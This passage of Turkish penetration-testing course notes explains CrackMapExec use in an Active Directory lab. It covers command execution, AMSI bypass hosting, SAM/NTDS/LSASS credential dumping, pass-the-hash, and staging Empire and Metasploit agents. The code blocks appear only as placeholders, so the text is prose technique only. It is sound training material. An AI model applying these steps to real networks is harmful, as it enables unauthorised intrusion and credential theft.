`AdminCount` attribute, SDProp process'in bir kullanıcıyı koruyup korumadığını belirler. Bu process'te, Active Directory'deki `AdminSDHolder`, korunan user account'lar için ACL permissions'ın bir template'i olarak görev yapar. Eğer herhangi bir account ACE'si (örneğin, bir attacker tarafından) modified edilirse, bu process tarafından korunan account'ların ACL permissions'ı, `SDProp` process her çalıştığında (default olarak her 60 dakikada bir çalışır, ancak bu süre modified edilebilir) templated permission set'e resetlenir. User, adminCount değeri 0 olarak set edilmişse veya specified değilse bu koruma kapsamına girmez. Eğer attribute value 1 olarak set edilmişse, user korunur. Attacker'lar genellikle internal environment'ta adminCount attribute'i 1 olan account'ları target olarak arar. Bunlar genellikle privileged account'lardır ve further access veya full domain compromise ile sonuçlanabilir.


### adminCount Attribute'u Sorgulama

{{CODE_BLOCK_140}}


### Domain SID'sini numaralandırma

Bazı domain attack'ları, bir user veya domain SID gibi belirli domain bilgilerini elde etmemizi gerektirir. SID (Security IDentifier), bir computer veya domain controller'ın sizi tanımlamak için kullandığı `unique bir ID` numarasıdır. Domain SID ise domain'i tanımlayan unique bir ID numarasıdır. CrackMapExec kullanarak domain SID'i elde etmek için `--get-sid` flag'ini kullanabiliriz:

### Domain SID'i Toplama

{{CODE_BLOCK_141}}


### Group Managed Service Accounts (gMSA)

Bağımsız Yönetilen Hizmet Hesabı (standalone Managed Service Account) (sMSA), aşağıdakileri sağlayan yönetilen bir domain hesabıdır:

* Otomatik parola yönetimi.
* Basitleştirilmiş service principal name (SPN) yönetimi.
* Yönetimi diğer yöneticilere devretme yeteneği

Bu yönetilen servis hesabı (MSA) türü Windows Server 2008 R2 ve Windows 7'de tanıtılmıştır.

Group Managed Service Account (gMSA) domain içinde aynı işlevselliği sağlar ancak aynı zamanda bu işlevselliği birden fazla sunucuya genişletir.

Bir gMSA hesabının parolasını okuma ayrıcalıklarına sahip bir hesabı belirlemek için PowerShell'i kullanabiliriz (komut yürütmeyi bir sonraki bölümde daha ayrıntılı olarak ele alacağız):

### Enumerating Accounts with gMSA Privileges

{{CODE_BLOCK_142}}


Yukarıdaki örnekte, `engels` kullanıcısının `PrincipalsAllowedToRetrieveManagedPassword` ayrıcalığına sahip olduğunu görebiliriz, bu da `svc_inlaneadm$` gMSA hesabının parolasını okuyabileceği anlamına gelir. gMSA parolasını okuma hakkına sahip bir hesabı tehlikeye atarsak, hesabın `NTLM` parola hash'ini almak için `--gmsa` seçeneğini kullanabiliriz.


### gMSA Parolasını Edinme

{{CODE_BLOCK_143}}

Bu kimlik bilgilerini kullanmak için, hash'ler için -H seçeneğini kullanabiliriz.

### svc_inlaneadm$ Hesabı ile Paylaşılan Klasörleri İnceleme

{{CODE_BLOCK_144}}


---

### RDP Screenshots

RDP protokolü aracılığıyla kullanıcı adlarını numaralandırmak için CrackMapExec'i kullanabiliriz. Hedef makinede RDP'ye yalnızca `NLA` ile izin verme seçeneği devre dışı bırakılmışsa, oturum açma isteminin ekran görüntüsünü almak için `--nlascreenshot` seçeneğini kullanabiliriz


### Enumerate Login Prompt

{{CODE_BLOCK_145}}

Ekran görüntüsünü açmak için MATE'in Eye'ını veya CLI'dan eom'u kullanabiliriz.


### Ekran Görüntüsünü Açmak için MATE'in Eye Kullanma

{{CODE_BLOCK_146}}

![Pasted image 20241202231735.png](/img/user/resimler/Pasted%20image%2020241202231735.png)

Eğer bir kullanıcı adı ve parolamız varsa, `--screenshot` seçeneği ile RDP protokolünü kullanarak da ekran görüntüsü alabiliriz. Bu seçenek `--screentime` ile birleştirilebilir, varsayılan olarak `10`, RDP bağlantısı açıldıktan sonra ekran görüntüsü almak için bekleyeceği süredir. Bu, bir hedef makineye bağlandığımızda ve hedefin masaüstünü yüklemesi 10 saniyeden fazla sürdüğünde kullanışlıdır.

Ekran görüntüsü seçeneğiyle birleştirilebilecek bir diğer seçenek de RDP bağlantısı sırasındaki ekran çözünürlüğüne karşılık gelen `--res` seçeneğidir. Bu seçenek yararlıdır çünkü aktif bir RDP oturumu bulursak, kullanıcının ekranının boyutuna bağlı olarak tüm içeriği görebiliriz veya göremeyiz. Varsayılan olarak bu seçenek `1024x768` olarak ayarlanmıştır


### Screenshot Alma

{{CODE_BLOCK_147}}


Not: `--screentime` ve `--res` isteğe bağlı bayraklardır.

Son olarak, ekran görüntüsünü açmak için MATE'in Eye'ını veya CLI'dan eom'u kullanabiliriz:


### Ekran Görüntüsünü Açmak için MATE'in Gözünü Kullanma

{{CODE_BLOCK_148}}

![Pasted image 20241202232523.png](/img/user/resimler/Pasted%20image%2020241202232523.png)

Bu bölümde, hedeflerimize ulaşmamıza yardımcı olabilecek LDAP ve RDP kullanarak çeşitli numaralandırma seçeneklerini inceledik. Aşağıdaki bölüm, CrackMapExec kullanarak komutların nasıl çalıştırılacağını gözden geçirecektir.


---

### Command Execution

Remote target üzerinde local administrator olarak bir komut çalıştırmaya çalışmadan önce `UAC`'nin varlığını kontrol etmeliyiz. UAC etkinleştirildiğinde, ki bu varsayılan durumdur, yalnızca `RID 500`'e sahip administrator hesabı (varsayılan administrator) remote komutları yürütebilir. Durumun böyle olup olmadığını kontrol etmek için iki registry key vardır:

`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy`
`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`

Varsayılan olarak, `LocalAccountTokenFilterPolicy` değeri 0 olarak ayarlanmıştır, yani yalnızca built-in administrator hesabı (RID 500) administration görevlerini gerçekleştirebilir. Local administrator grubunda olsak bile, yalnızca kullanıcımızın RID'si `500` ise remote komutları çalıştırabiliriz. Değer 1 olarak ayarlanırsa tüm administrative hesapları yönetim görevlerini yürütebilir.

Administrator yapılandırabileceği bir diğer ayar da local administrator hesabının (RID 500) remote yönetim görevlerini yerine getirmesini engellemektir. Bu, `FilterAdministratorToken` registry değerini 1 olarak ayarlayarak yapılabilir; bu, built-in administrator hesabının (RID 500) remote administrative tasks (remote yönetim görevleri) gerçekleştiremeyeceği anlamına gelir.


### Administrator Olarak Komut Yürütme

Komutları çalıştırmak ve administrators grubuna kimlerin üye olduğunu görmek için Administrator hesabını kullanalım. Windows komut satırı komutlarını çalıştırmak için `-x` seçeneğini ve ardından çalıştırmak istediğimiz komutu kullanmamız gerekir.


### Bir Komutu Administrator Olarak Çalıştırma

{{CODE_BLOCK_149}}


### RID 500 Olmayan Hesap Olarak Komut Yürütme

Yukarıdaki komutta, `localadmin` local user `Administrators` grubundadır, ancak remote komutu çalıştıramaz:

### Komutu localadmin olarak çalıştırma

{{CODE_BLOCK_150}}

Bu, UAC'nin etkin olduğu anlamına gelir. Eğer durum böyleyse, hesap administrator olsa bile (Pwn3d!) mesajını almayacağız. Bu ayarı geri almak istiyorsak, `LocalAccountTokenFilterPolicy`'yi 1 olarak ayarlayabiliriz.


### LocalAccountTokenFilterPolicy'yi Değiştirme

{{CODE_BLOCK_151}}


{{CODE_BLOCK_152}}


### Domain Hesabı Olarak Komut Yürütme

`LocalAccountTokenFilterPolicy` yalnızca local hesaplar için geçerlidir. Bir domain kullanıcımız varsa ve `administrators` grubunun bir parçasıysa, UAC ayarıyla bile komutu çalıştırabiliriz. Bu senaryoda, `INLANEFREIGHT\robert` hesabı `administrators` `grubunun` bir üyesidir, yani UAC etkin olsa bile komutları yürütebilir.


### Komutu Robert olarak çalıştır

{{CODE_BLOCK_153}}


### SMB ile Komut Yürütme

CME'nin dört (4) farklı komut yürütme yöntemi vardır:

| Komut   | Açıklama                                                                                                                             |
| ------- | ------------------------------------------------------------------------------------------------------------------------------------ |
| wmiexec | WMI (Windows Management Instrumentation) kullanılarak komutlar yürütülür (`diskte dosya oluşturulur`).                               |
| atexec  | Windows `görev zamanlayıcısı` ile bir görev planlayarak komutlar yürütülür (`fileless`, ancak Windows’un en son sürümünde çalışmaz). |
| smbexec | Bir servis oluşturup çalıştırarak komutlar yürütülür (`fileless`, ancak Windows’un en son sürümünde çalışmaz).                       |
| mmcexec | wmiexec yöntemine benzer, ancak komutlar Microsoft Yönetim Konsolu (MMC) aracılığıyla yürütülür.                                     |

Not: Her yöntem her bilgisayarda çalışmayabilir.

Varsayılan olarak, CME biri başarısız olursa farklı bir yürütme yöntemine geçecektir. Komutları aşağıdaki sırayla yürütmeye çalışır:

* 1. wmiexec 2. atexec 3. smbexec 4. mmcexec

CME'yi yalnızca bir yürütme yöntemi kullanmaya zorlamak istiyorsak, örneğin `--exec-method` bayrağını kullanarak hangisini kullanacağımızı belirtebiliriz:


### SMBExec Yöntemi ile Komut Yürütme

{{CODE_BLOCK_154}}

Alternatif olarak, -X seçeneğini kullanarak PowerShell ile komutları çalıştırabiliriz:

### wmiexec aracılığıyla PowerShell Komut Yürütme

{{CODE_BLOCK_155}}


PowerShell seçeneği -X çalıştırıldığında, perde arkasında `CrackMapExec` aşağıdakileri yapacaktır:

* AMSI bypass 
* Obfuscate the payload 
* Execute the payload

### Özel AMSI Bypass Çalıştırma

Bu teknikler `PowerShell` çalıştırılırken algılanabilir. Özel bir AMSI bypass payload'u kullanmak istiyorsak, `--amsi-bypass` seçeneğini ve ardından kullanmak istediğimiz payload'un yolunu kullanabiliriz. Örneğin, [AMSI Bypass Değiştirilmiş Amsi ScanBuffer](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell#modified-amsi-scanbuffer-patch) Yamasını kullanalım. Bunu bir dosyaya kaydedeceğiz ve bu AMSI Bypass'ı bir web sunucusundan belleğe yüklemek için bir PowerShell scripti oluşturacağız. İşte adımlar:

*  “Modified Amsi ScanBuffer Patch” içeren dosyayı indirin


### “Modified Amsi ScanBuffer Patch” ile Bir Dosya Oluşturun

{{CODE_BLOCK_156}}


Payload'u olduğu gibi çalıştırmaya çalışırsak, komut maksimum uzunluk olan 8191 karakteri aşacağı için başarısız olacaktır

### Komut Maksimum Uzunluğu Aşıyor

{{CODE_BLOCK_157}}

* Bu sorunu çözmek için, `shantanukhande-amsi.ps1` dosyasını indiren ve çalıştıran bir PowerShell scripti oluşturalım. Ayrıca scriptimizi barındırmak için bir Python web sunucusu oluşturmamız gerekecek.

### PowerShell Komut Dosyasını Oluşturma ve Barındırma

{{CODE_BLOCK_158}}


Not: Sonuna noktalı virgül (;) eklediğinizden emin olun.

Başka bir terminalden, yeni AMSI bypass payload'umuzu çalıştıralım:

### PowerShell Özel AMSI Bypass Kullanma

{{CODE_BLOCK_159}}


### WinRM Kullanarak Komut Yürütme

WinRM protokolü ile de komutları çalıştırabiliriz. Varsayılan olarak WinRM, HTTP TCP port `5985` ve HTTPS TCP port `5986`'yı dinler. Bu protokolle ilgili özel bir şey, bir kullanıcının komutları yürütmek için `administrator` olmasını gerektirmemesidir. `Administrators` grubunun üyesiysek, `Remote Management Users` grubunun üyesiysek veya oturum yapılandırmasında açık `PowerShell Remoting` izinlerimiz varsa WinRM protokolünü kullanabiliriz.

### Command Execution using WinRM

{{CODE_BLOCK_160}}


### WinRM aracılığıyla PowerShell Komut Yürütme

{{CODE_BLOCK_161}}

### Other PowerShell Options

WinRM komut yürütme ile kullanabileceğimiz çeşitli seçenekler vardır. Bunlardan bazılarını görelim:

| Seçenek           | Açıklama                                                |
| ----------------- | ------------------------------------------------------- |
| --port PORT       | WinRM bağlantısı için özel bir port seçmek.             |
| --ssl             | SSL etkinleştirilmiş WinRM'ye bağlanmak.                |
| --ignore-ssl-cert | SSL ile bağlanırken sertifika doğrulamasını yok saymak. |

Not: WinRM protokolü farklı yürütme yöntemlerini desteklemez.

### SSH Command Execution

CrackMapExec kullanarak Linux veya Windows üzerinde komutları çalıştırmak için SSH protokolünü de kullanabiliriz.

### Command Execution with SSH

{{CODE_BLOCK_162}}

Bir SSH sunucusuyla etkileşime girmenin bir başka yaygın yolu da `public` ve `private` keyleri kullanmaktır. CrackMapExec, `--key-file` seçeneği ile `private key` kullanımını destekler. Anahtarın çalışması için `OPENSSH` formatında olması gerekir.

### Private Key Kullanarak SSH ile Komut Yürütme

{{CODE_BLOCK_163}}

Not: Herhangi bir parola yapılandırılmamışsa, `-p` seçeneğini boş `(“”)` olarak ayarlamalıyız, aksi takdirde bir hata alırız

Bu bölümde, CrackMapExec kullanarak komutları yürütmek için üç farklı protokol keşfettik ve daha önce komutları yürütmek için MSSQL'in nasıl kullanılacağını tartıştık. Yazım sırasında, CrackMapExec komutları yürütmek için diğer dört protokolü desteklemektedir. Bir sonraki bölümde CrackMapExec'in kimlik bilgilerini ayıklamak için nasıl kullanılacağı tartışılacaktır.


### Gizli Bilgileri Bulma ve Kullanma

Parola çıkarma söz konusu olduğunda, CrackMapExec oldukça güçlüdür. On workstation ele geçirdiğimizi ve tümünden kimlik bilgilerini almak için LSASS process'inin belleğini dump istediğimizi düşünelim; CrackMapExec bunu yapabilir.

Bu bölümde, CrackMapExec'in Windows kimlik bilgilerini dump için sunduğu yöntemleri inceleyeceğiz.


### SAM

SAM database, tüm local kullanıcıların kimlik bilgilerini içerir ve birçok administrator local kimlik bilgilerini birden fazla makinede yeniden kullandığı için bunları ele geçirmek kritik öneme sahiptir. `SMB` ve `WinRM` protokolleriyle kullanılabilen `--sam` seçeneğini kullanarak SAM database içeriğini hızlı bir şekilde alabiliriz.

### Dumping SAM

{{CODE_BLOCK_164}}


### NTDS Active Directory Database

Kimlik bilgilerinin alınabileceği bir başka yer de Active Directory veritabanıdır. ntds.dit dosyası, kullanıcı objeleri, gruplar ve grup üyeliği hakkındaki bilgiler de dahil olmak üzere Active Directory verilerini depolayan bir veritabanıdır. Özellikle, dosya aynı zamanda domain'deki tüm kullanıcılar için parola hash'lerini de saklar (ve hatta bazen bir veya daha fazla hesap için [reversible encryption](https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) etkinleştirilmişse açık metin parolalarını da saklar). Bir Domain Admin hesabına veya bir replikasyon/DCSync gerçekleştirme ayrıcalıklarına sahip başka bir hesaba erişimimiz varsa, bir Domain Controller'dan hash'leri dökebiliriz

Hash'leri dump etmek için `--ntds` seçeneğini kullanmamız gerekir, aşağıdaki örnekte `robert` kullanıcısı bir Domain Admin değildir, ancak `replikasyon` gerçekleştirme ayrıcalıklarına sahiptir.

### Domain Controller üzerinden NTDS database dump etme

{{CODE_BLOCK_165}}

`--ntds` seçeneğini kullanırken `--user` ve `--enabled` seçeneklerini dahil edebiliriz. Eğer `--user` kullanırsak ayıklamak istediğimiz kullanıcıyı belirtebiliriz. KRBTGT hesabı için hash dump alalım.

### Yalnızca KRBTGT Hesabının Dump Edilmesi

{{CODE_BLOCK_166}}

Eğer `--enabled` olarak belirtirsek, sadece ekranda `etkin` olan kullanıcıları gösterecek ve bize etkin kullanıcıların listesini çıkarma seçeneği sunacaktır.


### Yalnızca Enabled Hesapları Gösterme

{{CODE_BLOCK_167}}


### Secrets (hash'leri) kullanma

Elde ettiğimiz şifreler NTLM hash'leridir. Hash'leri kırmayı deneyebilir veya parolayı kırmadan kullanıcı olarak kimlik doğrulaması yapmak için `Pass the Hash` tekniğini kullanabiliriz. 

CrackMapExec, parola yerine kimlik doğrulama yöntemi olarak bir NTLM hash'i gerektiren `-H` seçeneğine sahiptir:

### Using NTLM Hashes

{{CODE_BLOCK_168}}

NTLM kimlik doğrulaması SMB, WinRM , RDP, LDAP ve MSSQL protokolleri için desteklenir


### LSA Secrets/Cached Credentials

CrackMapExec, remote makineden herhangi bir agent çalıştırmadan hash dump işlemi gerçekleştiren `impacket-secretsdump`'tan alınmış `--lsa` seçeneğiyle birlikte gelir. Bu seçenek, Cached credentials, local machine key list, [Data Protection API (DPAPI)](https://en.wikipedia.org/wiki/Data_Protection_API) keys ve service credentials dahil olmak üzere LSA Secrets'ı dump eder.

`LSA Secrets`, Windows'ta Local Security Authority (LSA) tarafından kullanılan kritik veriler için benzersiz bir korumalı depolama alanıdır. LSA, bir sistemin local security policy'sini yönetmek, denetlemek, kimlik doğrulamak, kullanıcıların sistemde oturumunu açmak, özel verileri depolamak vb. için tasarlanmıştır. Kullanıcıların ve sistemlerin hassas verileri gizli dosyalarda saklanır. [DPAPI](https://en.wikipedia.org/wiki/Data_Protection_API) anahtarları verileri şifrelemek için kullanılır


### LSA'yı inceleyin
{{CODE_BLOCK_169}}


`DCC2$` ile başlayan hash formatı `Domain Cached Credentials 2 (DCC2)`, MS Cache 2'dir. Bu hash'ler, zayıf bir parola belirlenmişse `Hashcat` kullanılarak kırılabilir çünkü bu algoritma `NTLM`'den çok daha güçlüdür. Ayrıca, Domain Cached Credential hash'leri `Pas the Hash` saldırısı için kullanılamaz. Bunları kırmak için, domain ve kullanıcı adını kaldırmamız, `$DCC2$` 'den sonraki değeri almamız ve Hashcat modül 2100'ü kullanmamız gerekir.


### Cracking Hashes

{{CODE_BLOCK_170}}


{{CODE_BLOCK_171}}


### LSASS'tan Secrets elde etme

LSASS prosesinin belleği, Windows parolalarını `açık metin` olarak veya `NTLM` veya `AES256/AES128` gibi diğer hash biçimlerini içerir. Belleği dump etmek, bir domain administrator bulana kadar daha fazla hesap bulmak için etkili bir yol olabilir.

CrackMapExec, LSASS process belleğinin içeriğini dump etmek için çeşitli modüller içerir. Bunlardan bazılarını görelim:

* [Lsassy](https://github.com/login-securite/lsassy) Python aracı, bir dizi host üzerindeki kimlik bilgilerini remote olarak ayıklamak için kullanılır. Bu [blog](https://en.hackndo.com/remote-lsass-dump-passwords/) yazısı nasıl çalıştığını açıklamaktadır. Bu araç, bir LSASS dump'ındaki gerekli baytları remote okumak için `Impacket` projesini ve kimlik bilgilerini çıkarmak için `pypykatz` kullanır.


### Lsassy Module

{{CODE_BLOCK_172}}

* Procdump, LSASS process dump oluşturmak için Sysinternals'tan Microsoft `Procdump`'ı ve kimlik bilgilerini çıkarmak için `pypykatz`'ı kullanır.


### Procdump Module

{{CODE_BLOCK_173}}


* **[HandleKatz](https://github.com/codewhitesec/HandleKatz)** aracı, **LSASS**'e ait kopyalanmış **handle**'ların kullanımını göstererek, aynı **process**'in **gizlenmiş** bir bellek dump'ını oluşturur.


### Handlekatz Module

{{CODE_BLOCK_174}}


* **[Nanodump](https://github.com/helpsystems/nanodump)**, **LSASS process**'inin **minidump**'ını oluşturan esnek bir araçtır. **LSASS**'e bir **handle** açmak tespit edilebileceğinden, **Nanodump** mevcut **handle**'ları arayabilir. Eğer bir **handle** bulunursa, bunu kopyalayıp **minidump** oluşturmak için kullanır. Ancak, böyle bir **handle** bulunacağının garantisi yoktur.

Not : **Handle**, bir **process**'in **dosya, bellek bölgesi veya başka bir kaynak** ile etkileşime geçmesini sağlayan **benzersiz bir tanımlayıcıdır**.

### Nanodump Module

{{CODE_BLOCK_175}}

Bu bölümde bir bilgisayardan veya domain'den kimlik bilgilerini almak için farklı yöntemler gösterilmektedir. Bir sonraki bölümde CrackMapExec'in bir C2 framework ile birlikte kullanımı incelenecektir.

---


### Bir **C2 Framework** içinde **session**'ları alma.

CrackMapExec ile ilginç olabilecek bir şey, birden fazla hedefi tehlikeye attığımızda, daha fazla recon yapmak veya `Empire` veya `Metasploit` gibi bir C2 Framework kullanarak çalışmak isteyebiliriz. Her hedef makinede bir payload çalıştırmak ve C2'mize bir `agent` almak için CrackMapExec'i kullanabiliriz.

Bu bölümde CME'yi PowerShell Empire ve Metasploit framework ile entegre eden iki modül ele alınacaktır. Ayrıca farklı bir C2 framework'ü kullanırsak bir alternatif de keşfedeceğiz.


### Empire

Web sitelerinde sağlanan [kılavuzu](https://bc-security.gitbook.io/empire-wiki/quickstart/installation) kullanarak [Empire framework](https://github.com/BC-SECURITY/Empire)'ü yükleyerek başlayacağız


### Empire Server'ı Kurun ve Başlatın

{{CODE_BLOCK_176}}

Daha sonra Empire'ı seçtiğimiz kullanıcı adı ve şifre ile çalıştırmamız gerekiyor. Biz `empireadmin` kullanıcı adını ve `asdasd123` şifresini kullanacağız! .


### Empire'ı Özel Kullanıcı Adı ve Parola ile Çalıştırma

{{CODE_BLOCK_177}}

Ardından, CrackMapExec yapılandırma dosyasını ve Empire client yapılandırma dosyasını seçtiğimiz kullanıcı adı ve parolayla eşleşecek şekilde düzenlememiz gerekir.

CrackMapExec yapılandırma dosyası varsayılan olarak `~/.cme/cme.conf` adresinde bulunur. `[Empire]` seçeneğini `empireadmin` kullanıcı adı ve `asdasd123` şifresiyle eşleşecek şekilde değiştirmemiz gerekiyor! . Varsayılan olarak, Empire local server `1337` portunda çalışır. CrackMapExec yapılandırma dosyasında değiştirilebilir.


### CrackMapExec Configuration File

{{CODE_BLOCK_178}}


Aynı şeyi Empire yapılandırma dosyası için de yapmamız gerekiyor. Dosya `empire/client/config.yaml` adresinde bulunur:


### İnceleme

{{CODE_BLOCK_179}}


Yapılandırma dosyaları değiştirildikten sonra, Empire client ile Empire sunucusuna bağlanmalıyız

{{CODE_BLOCK_180}}

Şimdi listener'ı ayarlamamız gerekiyor ve host'u IP adresimize ve Port'u da aracının bağlanacağı TCP 8001'e ayarlayacağız.

### Empire Client Connection

{{CODE_BLOCK_181}}


### Empire Setting up IP and Port

{{CODE_BLOCK_182}}

Artık listener'ımız çalışıyor ve `empire_exec` modülü ile Empire'a bir `agent` almak için CrackMapExec'i kullanabiliriz. Ayarladığımız listener olan `LISTENER=http` seçeneğini eklememiz gerekiyor.


### CrackMapExec Modülünü Kullanma empire_exec

{{CODE_BLOCK_183}}


Bunu çalıştırdığımızda, PowerShell Empire'da yeni bir agent görmeliyiz.

![Pasted image 20241203121035.png](/img/user/resimler/Pasted%20image%2020241203121035.png)


### Metasploit

Aynı şeyi CrackMapExec modülü `web_delivery` kullanarak Metasploit Framework üzerinde de yapabiliriz. Metasploit Framework'te `web_delivery` modülünü yapılandırmamız ve sağlanan URL'yi CrackMapExec modülümüze bir parametre olarak kullanmamız gerekir. Msfconsole'u başlatalım ve `web_delivery` handler'ını yapılandıralım


### Metasploit Configure web_delivery Handler

{{CODE_BLOCK_184}}

Metasploit'te web delivery handler yapılandırıldıktan sonra web_delivery modülünü kullanabiliriz. `URL` ve `PAYLOAD` olmak üzere iki seçeneği destekler. URL seçeneğini Metasploit tarafından sağlanan URL ile ayarlamamız gerekir ve PAYLOAD seçeneği seçtiğimiz payload mimarisine karşılık gelir. Eğer `x64` kullanıyorsak, `x64` varsayılan değer olduğu için bu seçeneği atlayabiliriz ya da `PAYLOAD=64` kullanabiliriz. Eğer `32 bit` payload kullanıyorsak `PAYLOAD=32` seçeneğini ayarlamamız gerekir. Şimdi bunu çalışırken görelim:


### CrackMapExec web_delivery Module

{{CODE_BLOCK_185}}

{{CODE_BLOCK_186}}

Metasploit'te yeni bir oturum görmeliyiz:

![Pasted image 20241203121353.png](/img/user/resimler/Pasted%20image%2020241203121353.png)


### Other C2 Frameworks

Başka bir C2 Framework kullanmak istediğimizde, **Command Execution** bölümünde bahsedilen (SMB, WinRM, SSH) yöntemleri kullanarak aynı sonucu elde edebiliriz. Örneğin, bir **PowerShell** payload'u oluşturabilir, bu payload'u bir web sunucusuna kaydedebilir ve payload'u indirip çalıştırmak için **-X** seçeneğiyle bir PowerShell komutu çalıştırabiliriz. Ayrıca, işlemi arka planda yürütmek için **`--no-output`** seçeneğini seçmemiz gerekecektir.

Örnek olarak Metasploit'i kullanalım ve modülü kullanmak yerine web_delivery payload'unda sağlanan PowerShell script'ini kopyalamayı deneyelim:

![Pasted image 20241203122258.png](/img/user/resimler/Pasted%20image%2020241203122258.png)

Bu bölüm, CrackMapExec'i C2 Frameworks gibi diğer bilgisayar korsanlığı araçlarıyla nasıl kullanabileceğimizi araştırıyor. Bir sonraki bölümde CrackMapExec'in BloodHound ile nasıl entegre edileceği incelenecektir.


---

### Bloodhound Entegrasyonu

BloodHound, hem saldırganlar hem de savunmacılar tarafından alan güvenliğini analiz etmek için kullanılan açık kaynaklı bir araçtır. Araç, domain'den toplanan büyük miktarda veriyi alır. İlişkiyi görsel olarak temsil etmek ve geleneksel numaralandırma ile tespit edilmesi zor veya imkansız olan domain saldırı yollarını belirlemek için grafik teorisini kullanır. Bu bölümde Bloodhound'a aşina olduğunuzu varsayıyoruz. 


### **BloodHound**'da **Owned** olarak işaretleme.

BloodHound'da bir Node'u (user, grup, computer vb.) manuel olarak ele geçirilmiş (owned) olarak işaretleyebiliriz. Bunu yapmak için node'a sağ tıklayıp **`Mark X as Owned`** seçeneğine tıklamamız yeterlidir. Bu, ele geçirdiğimiz kullanıcıları ve bilgisayarları takip etmek açısından faydalıdır, özellikle büyük bir organizasyonla çalışırken. Ayrıca, **`Shortest Path from Owned Principals`** (Ele Geçirilmiş Principal'dan En Kısa Yol) veya **`Shortest Paths to Domain Admins from Owned Principals`** (Ele Geçirilmiş Principal'dan Domain Adminlerine En Kısa Yollar) gibi bir BloodHound cypher sorgusu gerçekleştirmek istediğimizde de kullanışlıdır.

CrackMapExec'i, ele geçirdiğimiz herhangi bir user veya computer'ı BloodHound veritabanında `owned` olarak işaretleyecek şekilde yapılandırabiliriz. Bunu yapmak için, `~/.cme/cme.conf` adresinde bulunan CrackMapExec yapılandırma dosyasını aşağıdaki seçeneklerle değiştirmemiz gerekir:

* Bloodhound yapılandırma seçeneği `bh_enabled`'ı `True` olarak ayarlayın.
* `bh_uri`'yi Bloodhound veritabanı `IP` adresimize ayarlayın.
* `bh_port`'u veritabanı `portuna` ayarlayın
* Kimlik bilgilerini bloodhound veritabanıyla eşleşecek şekilde ayarlayın: kullanıcı adı `neo4j` ve şifre `asdasd123` (Veritabanınıza karşılık geleni kullandığınızdan emin olun).

Yapılandırma aşağıdaki gibi görünmelidir:


### Configuring BloodHound Database

{{CODE_BLOCK_187}}

Not: Bağlandığınız BloodHound veritabanına karşılık gelen kullanıcı adı ve parolayı kullandığınızdan emin olun.

### Bloodhound Verilerinin Toplanması

BloodHound verilerini toplamak için CrackMapExec kullanarak SharpHound'u çalıştıracak ve ardından dosyayı saldırı hostumuza aktaracağız.

### BloodHound verilerinin toplanması

{{CODE_BLOCK_188}}

{{CODE_BLOCK_189}}

{{CODE_BLOCK_190}}

{{CODE_BLOCK_191}}

Şimdi BloodHound'u açmamız ve verileri içe aktarmamız gerekiyor.


### BloodHound'da Kullanıcıları Owned Olarak Ayarlama

Veriler içe aktarıldıktan sonra, `robert` kullanıcısı ile bağlanmaya çalışırsak, kullanıcıyı BloodHound veritabanında owned olunan olarak ayarlayacaktır.

### Kullanıcı BloodHound'da Owned Olarak Eklendi

{{CODE_BLOCK_192}}

Birden fazla kullanıcısı olan bir makineyi tehlikeye atarsak da aynı şey olacaktır. Bulunan tüm yeni kullanıcıları owned olarak ayarlayacaktır.

### Procdump Modülü ile Kullanıcıları Owned Olarak Ekleme

{{CODE_BLOCK_193}}


Not: Tüm CrackMapExec seçenekleri BloodHound veritabanı ile senkronize olmayacaktır. Örneğin, `--ntds` veya `--lsa` seçeneklerini denersek, kullanıcıları veritabanında sahip olunan olarak işaretlemez, ancak `procdump` veya `lsassy` gibi modüller kullanıcıları sahip olunan olarak işaretler.


### BloodHound'da Bilgisayarları Owned Olarak Ayarlama

Yazım sırasında, BloodHound entegrasyonu yalnızca user'ları Owned olarak işaretlemektedir. Bir `computer` owned olarak işaretlemek istiyorsak, `bh_owned` modülünü ve `neo4j` veritabanımızın kullanıcı adı ve şifresini kullanabiliriz. Aşağıdaki örnekte, diğer varsayılan değerler neo4j veritabanımızla eşleştiği için yalnızca `PASS` seçeneğini ekleyeceğiz.

{{CODE_BLOCK_194}}

{{CODE_BLOCK_195}}

BloodHound'un CrackMapExec'e entegrasyonu, büyük ağlarla uğraşırken birçok seçenek sunar ve müşterilerimizle paylaşmak istememiz durumunda veritabanını güncellemenin hızlı bir yoludur. Bir sonraki bölümde, CrackMapExec'te mevcut olan bazı popüler modüllerle çalışacağız.


----
### Popular Modules

CrackMapExec ile ilgili en heyecan verici şeylerden biri, modüler olması ve herkesin modüller oluşturmasına ve bunları araca katkıda bulunmasına izin vermesidir. CrackMapExec, exploit ve exploit sonrası görevleri kolaylaştırmak için işlemler gerçekleştirmemizi sağlayan 50'den fazla modüle sahiptir. Bu bölümde LDAP ve SMB protokolleri için bu modüllerden bazıları incelenecektir.


### LDAP Protocol Modules

LDAP protokolü yaygın olarak Domain Controller'lar ile etkileşime geçmemizi ve onlardan bilgi almamızı sağlar. Active Directory'den ilginç bilgiler çıkarmamızı sağlayacak bazı modülleri gözden geçirelim.


### **LDAP Module - get-network**

`get-network` modülü [Active Directory Integrated DNS dump](https://github.com/dirkjanm/adidnsdump)'ı  temel alır. Varsayılan olarak, Active Directory'deki herhangi bir kullanıcı, `zone transferine` benzer şekilde Domain veya Forest DNS bölgelerindeki tüm DNS kayıtlarını numaralandırabilir. Bu araç, internal ağların yeniden yapılandırılması amacıyla bölgedeki tüm DNS kayıtlarının numaralandırılmasını ve dışa aktarılmasını sağlar.

Modülü kullanmanın üç (3) yolu vardır:
* Sadece IP adresini almak.
* Sadece domain isimlerini al.
* Her ikisini de al (IP ve domain adları).

Varsayılan olarak, herhangi bir seçenek belirtmezsek, modül yalnızca IP adresini alacaktır. `ALL=true` seçeneğini seçersek, hem IP hem de domain adlarını alır ve `ONLY_HOSTS=true` olarak belirtirsek, yalnızca FQDN'yi alırız.


### DNS Sunucusundan (Record) Kayıtları Alma

{{CODE_BLOCK_196}}

{{CODE_BLOCK_197}}

{{CODE_BLOCK_198}}


Not: Bu yazının yazıldığı zamanda, modül **`adidnsdump`** aracıyla bazı farklılıklar göstermektedir. Sonuçlar, hesaplar arasında farklılık gösterebilir.


### LDAP Module - laps

